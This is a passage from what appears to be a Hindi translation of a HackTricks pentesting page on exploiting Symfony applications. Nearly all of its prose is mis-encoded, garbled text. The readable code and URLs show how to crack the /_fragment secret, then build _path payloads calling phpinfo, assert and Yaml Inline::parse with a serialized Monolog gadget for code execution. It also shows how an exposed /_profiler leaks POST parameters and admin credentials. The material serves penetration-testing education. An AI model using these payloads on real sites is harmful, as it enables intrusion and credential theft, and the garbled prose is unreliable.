рдЕрдм рд╣рдореЗрдВ рдпрд╣ рдЬреНрдЮрд╛рдд рд╣реИ рдХрд┐ рд░рд╣рд╕реНрдп рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдХреЗ рд╕рд╛рде, рдПрдХ рд╣реИрд╢ рдХрд╛ рднреА рдкрддрд╛ рд╣реИ:
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
рдЗрд╕рд╕реЗ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдХреБрд▓ 231 * 106 рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рдмрдЪрддреА рд╣реИрдВред рдпрд╣ [hashcat](https://hashcat.net) рдФрд░ рдПрдХ рдЕрдЪреНрдЫреА рд╕реЗрдЯ рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдЪреНрдЫреА рд╕реЗрдЯ рдХреЗ рд╕рд╛рде рд╕рдВрднрд╡ рд╣реИ, рд▓реЗрдХрд┐рди hashcat рдПрдХ `sha1(sha1($pass).$salt)` рдХрд░реНрдирд▓ рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рднрд╛рдЧреНрдп рд╕реЗ, рд╣рдордиреЗ рдЗрд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рд╣реИ! рдЖрдк [рдпрд╣рд╛рдВ рдкреБрд▓-рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ](https://github.com/hashcat/hashcat/pull/2536) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рд╣рдорд╛рд░реА рдХреНрд░реИрдХрд┐рдВрдЧ рдорд╢реАрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЬрд┐рд╕рдореЗрдВ 8 рдЬреАрдкреАрдпреВ рд╣реИрдВ, рд╣рдо рдЗрд╕ рд╣реИрд╢ рдХреЛ _20 рдШрдВрдЯреЗ рдХреЗ рдЕрдВрджрд░_ рдХреНрд░реИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `/_fragment` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рдирд┐рд╖реНрдХрд░реНрд╖ <a href="#conclusion" id="conclusion"></a>

рд╕рд┐рдордлреЛрдиреА рдЕрдм рдХрдИ PHP рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдореВрд▓ рдШрдЯрдХ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдлреНрд░реЗрдорд╡рд░реНрдХ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ, рд╡рд╣ рдмрд╣реБрдд рд╕рд╛рд░реА рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╛ рддреЛ рдПрдХ рдХрдордЬреЛрд░ рд╕реАрдХреНрд░реЗрдЯ рдпрд╛ рдПрдХ рдХрдо рдкреНрд░рднрд╛рд╡реА рд╕рдВрдХрдЯ рд╣рдорд▓рд╛рд╡рд░реНрддреА рдХреЛрдб рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдПрдХ рдмреНрд▓реВ рдЯреАрдорд░ рдХреЗ рд░реВрдк рдореЗрдВ, рдЖрдкрдХреЛ рдЕрдкрдиреА рд╕рд┐рдордлреЛрдиреА-рдЖрдзрд╛рд░рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдкрд░ рдирдЬрд░ рд░рдЦрдиреА рдЪрд╛рд╣рд┐рдПред рдЕрджреНрдпрддрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЛ рд╕рдВрдХрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдмрд╛рд╣рд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╕реАрдХреНрд░реЗрдЯ рдХреБрдВрдЬреА рдЙрддреНрдкрд╛рдж рдХреА рдкрд╣рд▓реА рд╕реНрдерд╛рдкрдирд╛ рдкрд░ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдиреЗ рдХреБрдЫ рд╕рд╛рд▓ рдкрд╣рд▓реЗ рдПрдХ Symfony-3.x-рдЖрдзрд╛рд░рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рдмрдирд╛рдИ рдереА рдФрд░ рд░рд╛рд╕реНрддреЗ рдореЗрдВ рдЗрд╕реЗ рдЕрджреНрдпрддрд┐рдд рд░рдЦрд╛, рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд╕реАрдХреНрд░реЗрдЯ рдХреБрдВрдЬреА рдЕрднреА рднреА рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реИред

## рд╢реЛрд╖рдг <a href="#exploitation" id="exploitation"></a>

### рд╕рд┐рджреНрдзрд╛рдВрдд <a href="#theory" id="theory"></a>

рдПрдХ рддрд░рдл рдкрд░, рд╣рдореЗрдВ рдЗрд╕ рд╕рдВрдХрдЯ рдХрд╛ рд╢реЛрдз рдХрд░рддреЗ рд╕рдордп рдХреБрдЫ рдЪреАрдЬреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЪрд┐рдВрддрд╛ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:

* HMAC **рдкреВрд░рд╛ URL** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧрдгрдирд╛ рдХреА рдЬрд╛рддреА рд╣реИред рдпрджрд┐ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдПрдХ рдкреНрд░рддрд┐рд░реЛрдзреА рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдкреАрдЫреЗ рд╣реИ, рддреЛ рд╣рдореЗрдВ рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ URL рдХреА рдмрдЬрд╛рдп рд╕реЗрд╡рд╛ рдХреЗ рдЖрдВрддрд░рд┐рдХ URL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдВрддрд░рд┐рдХ URL HTTP рдХреЗ рдмрдЬрд╛рдп HTTPS рдкрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
* HMAC рдХрд╛ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рд╡рд░реНрд╖реЛрдВ рдХреЗ рдмрд╛рдж рдмрджрд▓ рдЧрдпрд╛ рд╣реИ: рдпрд╣ рдкрд╣рд▓реЗ **SHA-1** рдерд╛, рдФрд░ рдЕрдм **SHA-256** рд╣реИред
* рд╕рд┐рдордлреЛрдиреА рдиреЗ рдЕрдиреБрд░реЛрдз рд╕реЗ `_hash` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рд╕реЗ URL рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдЙрд╕реА URL рдкрд░ рд╣реИрд╢ рдХреА рдЧрдгрдирд╛ рдХрд░рдиреА рд╣реЛрдЧреА рдЬреИрд╕рд╛ рдХрд┐ рдпрд╣ рдХрд░рддрд╛ рд╣реИред
* рдХрдИ рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдЙрди рд╕рднреА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рд╣реЛрдЧреАред
* рдХреБрдЫ PHP рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░, рд╣рдо "рд╕рдВрджрд░реНрдн рджреНрд╡рд╛рд░рд╛" рдкреИрд░рд╛рдореАрдЯрд░ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдирд╣реАрдВ рдмреБрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ `system($command, &$return_value)`ред
* рдХреБрдЫ рд╕рд┐рдордлреЛрдиреА рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░, `_controller` рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рдПрдХ рд╡рд┐рдзрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рд╣рдореЗрдВ рдПрдХ рд╕рд┐рдордлреЛрдиреА рд╡рд┐рдзрд┐ рдвреВрдВрдврд╝рдиреА рд╣реЛрдЧреА рдЬреЛ рд╣рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

рджреВрд╕рд░реА рдУрд░, рд╣рдо рдХреБрдЫ рдмрд╛рддреЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ:

* рдХреЛрдИ рдкреИрд░рд╛рдореАрдЯрд░ рдирд╣реАрдВ рд╣реЛрдиреЗ рдкрд░ `/_fragment` рдХреЛ рд╣рд┐рдЯ рдХрд░рдиреЗ рдкрд░, рдпрд╛ рдПрдХ рдЕрдорд╛рдиреНрдп рд╣реИрд╢ рдХреЗ рд╕рд╛рде `/_fragment` рдХреЛ рд╣рд┐рдЯ рдХрд░рдиреЗ рдкрд░, `403` рд▓реМрдЯрдирд╛ рдЪрд╛рд╣рд┐рдПред
* рдПрдХ рд╡реИрдз рд╣реИрд╢ рдХреЗ рд╕рд╛рде `/_fragment` рдХреЛ рд╣рд┐рдЯ рдХрд░рдиреЗ рдкрд░ рд▓реЗрдХрд┐рди рдПрдХ рд╡реИрдз рдирд┐рдпрдВрддреНрд░рдХ рдирд╣реАрдВ рд╣реЛрдиреЗ рдкрд░, `500` рд▓реМрдЯрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЕрдВрддрд┐рдо рдмрд┐рдВрджреБ рд╣рдореЗрдВ рдпрд╣ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╣рдо рд╕реАрдзреЗ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рдХреНрдпрд╛ рд╣рдореЗрдВ рдПрдХ рдХрдХреНрд╖рд╛ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рд╣рдо рдкрд╣рд▓реЗ, рд╕рдмрд╕реЗ рд╕реАрдзрд╛ рддрд░реАрдХрд╛ рдкрд╣рд▓реЗ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ `phpinfo ([ int $what = INFO_ALL ] )` ([рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://www.php.net/manual/en/function.phpinfo.php)) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред `_path` GET рдкреИрд░рд╛рдореАрдЯрд░ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧрд╛:
```
_controller=phpinfo
&what=-1
```
рдФрд░ URL рдЗрд╕ рддрд░рд╣ рд╕реЗ рджрд┐рдЦреЗрдЧрд╛:

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

рдпрджрд┐ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ `phpinfo()` рдкреГрд╖реНрда рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдо рдЬреАрдд рдЧрдПред рдлрд┐рд░ рд╣рдо рдПрдХ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ `assert`:

_`_controller=assert` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдореВрдирд╛ рдЖрдЙрдЯрдкреБрдЯ_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

рдЕрдиреНрдпрдерд╛, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдореЗрдВ рдПрдХ рдХрдХреНрд╖рд╛ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдЪреНрдЫрд╛ рдЙрдореНрдореАрджрд╡рд╛рд░ рд╣реИ `Symfony\Component\Yaml\Inline::parse`, рдЬреЛ рдПрдХ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд Symfony рдХрдХреНрд╖рд╛ рд╣реИ, рдФрд░ рдЗрд╕рд▓рд┐рдП Symfony рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдкрд░ рдореМрдЬреВрдж рд╣реИред

рд╕реНрд╡рд╛рднрд╛рд╡рд┐рдХ рд░реВрдк рд╕реЗ, рдпрд╣ рд╡рд┐рдзрд┐ рдПрдХ YAML рдЗрдирдкреБрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рддреА рд╣реИред Symfony рдХрд╛ [YAML](https://yaml.org) рдкрд╛рд░реНрд╕рд░ `php/object` рдЯреИрдЧ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдПрдХ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝реНрдб рдЗрдирдкреБрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ `unserialize()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░реЗрдЧрд╛ред рдЗрд╕рд╕реЗ рд╣рдо рдЕрдкрдиреЗ рдкрд╕рдВрджреАрджрд╛ PHP рдЯреВрд▓, [PHPGGC](https://github.com/ambionics/phpggc) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ!

рд╡рд┐рдзрд┐ рдХрд╛ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рд╡рд░реНрд╖реЛрдВ рдХреЗ рд╕рд╛рде рдмрджрд▓ рдЧрдпрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣рд╛рдВ рддреАрди рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рд╣реИрдВ:
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
рдЗрдирдореЗрдВ рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдХреЗ рд▓рд┐рдП `_path` рдирд┐рд░реНрдорд┐рдд рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп, рд╣рдо рдЗрд╕ рддрдереНрдп рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпрджрд┐ рд╣рдо рдПрдХ рдРрд╕рд╛ рддрд░реНрдХ рджреЗрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд╕рд╛рде рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЙрдкреЗрдХреНрд╖рд┐рдд рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рд╣рдо рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЪрд┐рдВрддрд╛ рдХрд┐рдП рдмрд┐рдирд╛ рд╡рд┐рдзрд┐ рдореЗрдВ рд╣рд░ рд╕рдВрднрд╡ рддрд░реНрдХ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣рдо `_path` рдЗрд╕ рддрд░рд╣ рдирд┐рд░реНрдорд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
рдлрд┐рд░ рд╕реЗ, рд╣рдо `phpinfo()` рдХреЗ рд╕рд╛рде рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рд╣рд╛рдБ, рддреЛ рд╣рдо `system()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

_рдПрдХ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝реНрдб рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде `Inline::parse` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдореВрдирд╛ рдЖрдЙрдЯрдкреБрдЯ_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

рдЗрд╕рд▓рд┐рдП, рдпрд╣ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣рд░ рд╕рдВрднрд╡ рдЪрд░рд┐рддреНрд░ рд╕рдВрдпреЛрдЬрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЪрд▓реЗрдЧрд╛, рдФрд░ рдлрд┐рд░ рджреЛ рд╢реЛрд╖рдг рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ред рдХреЛрдб [рд╣рдорд╛рд░реЗ GitHub рдкрд░](https://github.com/ambionics/symfony-exploits) рдЙрдкрд▓рдмреНрдз рд╣реИред

## рд╕рд┐рдордлреЛрдиреА /\_рдкреНрд░реЛрдлрд╛рдЗрд▓рд░ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдКрдкрд░ рджрд┐рдП рдЧрдП рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджреЗрдЦрддреЗ рд╣реИрдВ, рдкреГрд╖реНрда рдХреЗ рджрд╛рдПрдВ рдирд┐рдЪрд▓реЗ рдХреЛрдиреЗ рдкрд░ `sf` рд▓реЛрдЧреЛ рд╣реИред рдпрд╣ рд▓реЛрдЧреЛ рд╕рд┐рдордлреЛрдиреА debug рдореЛрдб рдХреЗ рддрд╣рдд рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдпрд╣ рд▓реЛрдЧреЛ рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП `/_profiler` рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд╕реНрд╡реАрд░ рдореЗрдВ рджрд┐рдЦрд╛рдП рдЧрдП рдкреГрд╖реНрда рдХреЛ рджреЗрдЦреЗрдВрдЧреЗ

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЛ рд╕рд┐рдордлреЛрдиреА рдкреНрд░реЛрдлрд╛рдЗрд▓рд░ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрд╣реБрдд рдХрдо рдЬрд╛рдирдХрд╛рд░реА рд╣реИред рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╕реНрдкрд╖реНрдЯ рд╣реИ; рдпрд╣ рдЖрдкрдХреЛ рддреНрд░реБрдЯрд┐ рдпрд╛ рдмрдЧ рд╣реЛрдиреЗ рдкрд░ рдбреАрдмрдЧ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред рдмреЗрд╢рдХ, рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рдХреЗрд╡рд▓ рдЬрдм debug рдореЛрдб рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ рддрдм рд╣реА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

рд╕рд┐рдордлреЛрдиреА рдлреНрд░реЗрдорд╡рд░реНрдХ рдЦреБрдж рдмрд╣реБрдд рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рд▓реЗрдХрд┐рди debug рдореЛрдб рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рд╕реЗ рдпрд╣ рдлреНрд░реЗрдорд╡рд░реНрдХ рдЕрддреНрдпрдВрдд рдЖрдкрджрд╛рдЬрдирдХ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреНрд░реЛрдлрд╛рдЗрд▓рд░ рдореЗрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдкреНрд░реЛрдлрд╛рдЗрд▓ рд╕рд░реНрдЪ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдКрдкрд░ рджрд┐рдП рдЧрдП рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджреЗрдЦрддреЗ рд╣реИрдВ, рдЖрдк рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬреЗ рдЧрдП рд╕рднреА рдЕрдиреБрд░реЛрдзреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдЯреЛрдХрди рдореЗрдВ рд╣реИрд╢ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ, рдЖрдк рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рд╕рднреА POST рдкреИрд░рд╛рдореАрдЯрд░ рдкрдврд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рд╕рд╛рде, рд╣рдо рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЦрд╛рддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдЕрдиреНрдп Debug рд╕рдХреНрд╖рдо рдЕрдВрдд-рдмрд┐рдВрджреБ

рдЖрдкрдХреЛ рдЗрди URLs рдХреА рднреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## рд╕рдВрджрд░реНрдн

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд░рдЦрддреЗ рд╣реИрдВ? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

